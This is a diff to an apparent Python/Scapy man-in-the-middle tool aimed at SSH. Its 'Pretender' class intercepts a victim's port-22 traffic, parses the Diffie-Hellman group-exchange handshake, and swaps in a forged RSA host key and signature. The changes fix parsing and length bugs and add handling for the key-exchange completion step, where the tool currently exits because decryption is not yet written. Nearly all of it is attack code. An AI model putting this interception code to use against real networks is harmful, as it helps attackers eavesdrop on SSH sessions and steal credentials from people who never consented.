@@ -63,7 +63,8 @@ class Pretender:
 		self.rsa = None
 		self.hash = None
 		self.aes = None
-
+		# Post key-exchange
+		self.KEYS_SET = False
 	#enddef
 
 	def process (self, packet):
@@ -83,34 +84,43 @@ class Pretender:
 				if packet.haslayer(Raw):
 					self.fake_client["plen"] = len(packet[Raw].load)
 					if packet[TCP].dport == 22 or packet[TCP].sport == 22:
+						old_raw = packet[Raw].load
 						old_len = len(packet[Raw].load)
 						new_payload = self.parseSSH(packet[Raw].load,True) # True: from client
 						diff_len = old_len - len(new_payload)
+						if diff_len != 0:
+							print "\nClient"
+							print "==== wrong packet length ==="
+							print "old - " + str(len(old_raw))
+							print old_raw
+							print "new - " + str(len(new_payload))
+							print new_payload + "\n\n"
+						#endif
 						packet[IP].len = packet[IP].len - diff_len
 						del packet[TCP].chksum
 						del packet[IP].chksum
 					#endif
 				#endif
-				# expected ack
-				assigned_ack = ""
-				self.fake_client["expected_ack"] = self.fake_client["seq"] + self.fake_client["plen"]
-				if self.fake_server["expected_ack"] != None and self.fake_server["expected_ack"] != self.fake_client["ack"]:
-					packet[TCP].ack = self.fake_server["expected_ack"]
-					assigned_ack = " >> " + str(self.fake_server["expected_ack"])
-				#endif
-				# expected seq from client to server
-				assigned_seq = ""
-				if self.fake_server["ack"] != None and self.fake_client["seq"] != self.fake_server["ack"]:
-					packet[TCP].seq = self.fake_server["ack"]
-					assigned_seq = " >> " + str(self.fake_server["ack"])
-				#endif
-				print "From client:"
-				print "SEQ: " + str(self.fake_client["seq"]) + assigned_seq
-				print "ACK: " + str(self.fake_client["ack"]) + assigned_ack
-				print "LEN: " + str(self.fake_client["plen"])
-				print "ECK: " + str(self.fake_client["expected_ack"])
-				print " "
-			elif EX.get(packet[Ether].src) == victimMAC:
+				# # expected ack
+				# assigned_ack = ""
+				# self.fake_client["expected_ack"] = self.fake_client["seq"] + self.fake_client["plen"]
+				# if self.fake_server["expected_ack"] != None and self.fake_server["expected_ack"] != self.fake_client["ack"]:
+				# 	packet[TCP].ack = self.fake_server["expected_ack"]
+				# 	assigned_ack = " >> " + str(self.fake_server["expected_ack"])
+				# #endif
+				# # expected seq from client to server
+				# assigned_seq = ""
+				# if self.fake_server["ack"] != None and self.fake_client["seq"] != self.fake_server["ack"]:
+				# 	packet[TCP].seq = self.fake_server["ack"]
+				# 	assigned_seq = " >> " + str(self.fake_server["ack"])
+				# #endif
+				# print "From client:"
+				# print "SEQ: " + str(self.fake_client["seq"]) + assigned_seq
+				# print "ACK: " + str(self.fake_client["ack"]) + assigned_ack
+				# print "LEN: " + str(self.fake_client["plen"])
+				# print "ECK: " + str(self.fake_client["expected_ack"])
+				# print " "
+			elif packet[Ether].src == self.fake_server["src"]:
 				# packet from server
 				# initialization
 				if self.fake_server["seq"] == None and packet[TCP].seq != 0:
@@ -124,50 +134,69 @@ class Pretender:
 				if packet.haslayer(Raw):
 					self.fake_server["plen"] = len(packet[Raw].load)
 					if packet[TCP].dport == 22 or packet[TCP].sport == 22:
+						old_raw = packet[Raw].load
 						old_len = len(packet[Raw].load)
 						new_payload = self.parseSSH(packet[Raw].load,False) # False: from server
 						diff_len = old_len - len(new_payload)
+						if diff_len != 0:
+							print "\nServer"
+							print "==== wrong packet length ==="
+							print "old - " + str(len(old_raw))
+							print old_raw
+							print "new - " + str(len(new_payload))
+							print new_payload + "\n\n"
+						#endif
 						packet[IP].len = packet[IP].len - diff_len
 						del packet[TCP].chksum
 						del packet[IP].chksum
 					#endif
 				#endif
-				# expected ack
-				assigned_ack = ""
-				self.fake_server["expected_ack"] = self.fake_server["seq"] + self.fake_server["plen"]
-				if self.fake_client["expected_ack"] != None and self.fake_client["expected_ack"] != self.fake_server["ack"]:
-					packet[TCP].ack = self.fake_client["expected_ack"]
-					assigned_ack = " >> " + str(self.fake_client["expected_ack"])
-				#endif
-				# expected seq from server to client
-				assigned_seq = ""
-				if self.fake_client["ack"] != None and self.fake_server["seq"] != self.fake_client["ack"]:
-					packet[TCP].seq = self.fake_client["ack"]
-					assigned_seq = " >> " + str(self.fake_client["ack"])
-				#endif
-				print "From server:"
-				print "SEQ: " + str(self.fake_server["seq"]) + assigned_seq
-				print "ACK: " + str(self.fake_server["ack"]) + assigned_ack
-				print "LEN: " + str(self.fake_server["plen"])
-				print "ECK: " + str(self.fake_server["expected_ack"])
-				print " "
+				# # expected ack
+				# assigned_ack = ""
+				# self.fake_server["expected_ack"] = self.fake_server["seq"] + self.fake_server["plen"]
+				# if self.fake_client["expected_ack"] != None and self.fake_client["expected_ack"] != self.fake_server["ack"]:
+				# 	packet[TCP].ack = self.fake_client["expected_ack"]
+				# 	assigned_ack = " >> " + str(self.fake_client["expected_ack"])
+				# #endif
+				# # expected seq from server to client
+				# assigned_seq = ""
+				# if self.fake_client["ack"] != None and self.fake_server["seq"] != self.fake_client["ack"]:
+				# 	packet[TCP].seq = self.fake_client["ack"]
+				# 	assigned_seq = " >> " + str(self.fake_client["ack"])
+				# #endif
+				# print "From server:"
+				# print "SEQ: " + str(self.fake_server["seq"]) + assigned_seq
+				# print "ACK: " + str(self.fake_server["ack"]) + assigned_ack
+				# print "LEN: " + str(self.fake_server["plen"])
+				# print "ECK: " + str(self.fake_server["expected_ack"])
+				# print " "
 			#endif
 		#endif
 	#enddef
 
 	def parseSSH (self, raw, from_client):
+		if self.KEYS_SET == True:
+			payload = raw
+			if from_client:
+				# Decrypt first packet
+				print "[*] Key Exchanged Sucessfully"
+				print "[*] Decryption needs implementation"
+				print "[*] Goodbye!"
+				sys.exit(1)
+			#endif
+			return payload
+		#endif
+
 		payload = SSH(raw)
 		if payload.err:
 			return
 		#endif
-
 		if payload.SSH_VEX == True:
 			if from_client:
-				self.fake_client["V_C"] = self.v
+				self.fake_client["V_C"] = payload.v.strip()
 			else:
-				self.fake_server["V_S"] = self.v
+				self.fake_server["V_S"] = payload.v.strip()
 			#endif
-			return
 		elif payload.SSH_MSG_KEXINIT == KEX_INIT:
 			if from_client:
 				self.fake_client["I_C"] = raw
@@ -209,7 +238,7 @@ class Pretender:
 				fake_host_key = \
 				int_to_hex(len(payload.rsa["alg"]),4) + payload.rsa["alg"] + \
 				int_to_hex(len(payload.rsa["e"]),4) + int_to_hex(self.fake_server["rsa_key"]["e"],len(payload.rsa["e"])) + \
-				int_to_hex(len(payload.rsa["n"]),4) + int_toHex(self.fake_server["rsa_key"]["n"],len(payload.rsa["n"]))
+				int_to_hex(len(payload.rsa["n"]),4) + int_to_hex(self.fake_server["rsa_key"]["n"],len(payload.rsa["n"]))
 				payload.host_key = fake_host_key
 				# F
 				self.f = int(binascii.hexlify(payload.f),16)
@@ -229,11 +258,11 @@ class Pretender:
 				int_to_hex(self.fake_client["min"],4) + \
 				int_to_hex(self.fake_client["n"],4) + \
 				int_to_hex(self.fake_client["max"],4) + \
-				int_to_hex(self.p,0) + \
-				int_to_hex(self.g,0) + \
-				int_to_hex(self.e,0) + \
-				int_to_hex(fake_f,0) + \
-				int_to_hex(self.fake_server["shared_key"],0)
+				int_to_hex(self.p,1) + \
+				int_to_hex(self.g,1) + \
+				int_to_hex(self.e,1) + \
+				int_to_hex(fake_f,1) + \
+				int_to_hex(self.fake_server["shared_key"],1)
 					# Hashed - SHA256
 				m = hashlib.sha256()
 				m.update(h_string)
@@ -242,9 +271,15 @@ class Pretender:
 				key = RSA.construct((self.fake_server["rsa_key"]["n"],self.fake_server["rsa_key"]["e"],self.fake_server["rsa_key"]["d"]))
 				cipher_rsa = PKCS1_OAEP.new(key)
 				signed = cipher_rsa.encrypt(digest)
-				fake_sig = int_to_hex(payload.sig["alg"],4) + payload.sig["alg"] + \
+				fake_sig = int_to_hex(len(payload.sig["alg"]),4) + payload.sig["alg"] + \
 				int_to_hex(len(signed),4) + signed
 				payload.signature = fake_sig
+			#endif
+		elif payload.SSH_MSG_KEXINIT == NEW_KEYS:
+			if from_client:
+				self.KEYS_SET = True
+			else:
+				return
 			#endif
 		#endif
 
@@ -264,11 +299,10 @@ class SSH:
 
 		self.err = False
 		self.SSH_VEX = False
-
-		if payload[0:2] == "SSH":
+		if payload[0:3] == "SSH":
 			# This is SSH version exchange
 			self.SSH_VEX = True
-			self.v = payload.strip()
+			self.v = payload
 			return
 		#endif
 		if len(payload) % 2 != 0 or len(payload) < 6:
@@ -329,19 +363,19 @@ class SSH:
 		elif self.SSH_MSG_KEXINIT == DH_GEX_GROUP:
 			# Server sends P and G
 			# P
-			p_len = int(payload[6:10],16)
+			p_len = int(binascii.hexlify(payload[6:10]),16)
 			self.modulus = payload[10:10+p_len]
 			rest = payload[10+p_len:]
 			# G
-			g_len = int(rest[0:1],16)
-			self.base = rest[1:1+g_len]
-			rest = rest[1+g_len:]
+			g_len = int(binascii.hexlify(rest[0:4]),16)
+			self.base = rest[4:4+g_len]
+			rest = rest[4+g_len:]
 			# rest
 			self.rest = rest[0:-self.padding_len]
 		elif self.SSH_MSG_KEXINIT == DH_GEX_INIT:
 			# Client sends E
 			# E
-			e_len = int(payload[6:10],16)
+			e_len = int(binascii.hexlify(payload[6:10]),16)
 			self.e = payload[10:10+e_len]
 			rest = payload[10+e_len:]
 			# rest
@@ -349,33 +383,42 @@ class SSH:
 		elif self.SSH_MSG_KEXINIT == DH_GEX_REPLY:
 			# Server replies with host key, f, signature
 			# Host key
-			host_len = int(payload[6:10],16)
+			host_len = int(binascii.hexlify(payload[6:10]),16)
 			self.host_key = payload[10:10+host_len]
 			rest = payload[10+host_len:]
 				# RSA
-			alg_len = int(self.host_key[0:4],16)
+			self.rsa = {}
+			alg_len = int(binascii.hexlify(self.host_key[0:4]),16)
 			self.rsa["alg"] = self.host_key[4:4+alg_len]
-			rsa_e_len = int(self.host_key[4+alg_len:8+alg_len])
+			rsa_e_len = int(binascii.hexlify(self.host_key[4+alg_len:8+alg_len]),16)
 			self.rsa["e"] = self.host_key[8+alg_len:8+alg_len+rsa_e_len]
-			rsa_n_len = int(self.host_key[8+alg_len+rsa_e_len:12+alg_len+rsa_e_len])
+			rsa_n_len = int(binascii.hexlify(self.host_key[8+alg_len+rsa_e_len:12+alg_len+rsa_e_len]),16)
 			self.rsa["n"] = self.host_key[12+alg_len+rsa_e_len:12+alg_len+rsa_e_len+rsa_n_len]
 			# F
-			f_len = int(rest[0:4],16)
+			f_len = int(binascii.hexlify(rest[0:4]),16)
 			self.f = rest[4:4+f_len]
 			rest = rest[4+f_len:]
 			# Signature
-			sig_len = int(rest[0:4],16)
+			sig_len = int(binascii.hexlify(rest[0:4]),16)
 			self.signature = rest[4:4+sig_len]
 			rest = rest[4+sig_len:]
 				# Alg
-			sig_alg_len = int(self.signature[0:4],16)
+			self.sig = {}
+			sig_alg_len = int(binascii.hexlify(self.signature[0:4]),16)
 			self.sig["alg"] = self.signature[4:4+sig_alg_len]
 			# rest
 			self.rest = rest[0:-self.padding_len]
+		elif self.SSH_MSG_KEXINIT == NEW_KEYS:
+			# rest
+			self.rest = payload[6:-self.padding_len]
 		#endif
 	#enddef
 
 	def reconstruct (self):
+		if self.SSH_VEX == True:
+			return self.v
+		#enddef
+
 		# SSH_MSG_KEXINIT must exist
 		payload = chr(self.SSH_MSG_KEXINIT)
 		# Codes
@@ -414,6 +457,9 @@ class SSH:
 			payload = payload + int_to_hex(len(self.f),4) + self.f
 			# Signature
 			payload = payload + int_to_hex(len(self.signature),4) + self.signature
+		elif self.SSH_MSG_KEXINIT == NEW_KEYS:
+			# Do nothing
+			pass
 		#endif
 
 		# rest
@@ -443,7 +489,11 @@ def to_hex (ch):
 
 def int_to_hex (i, num_of_bytes):
 	# Turn an integer into binary data with a speicifed number of bytes
-	return binascii.unhexlify("{0:0{1}x}".format(i,num_of_bytes*2))
+	s = "{0:0{1}x}".format(i,num_of_bytes*2)
+	if len(s) % 2 != 0:
+		s = "0" + s
+	#endif
+	return binascii.unhexlify(s)
 #enddef
 
 def get_padlen (payload_len):
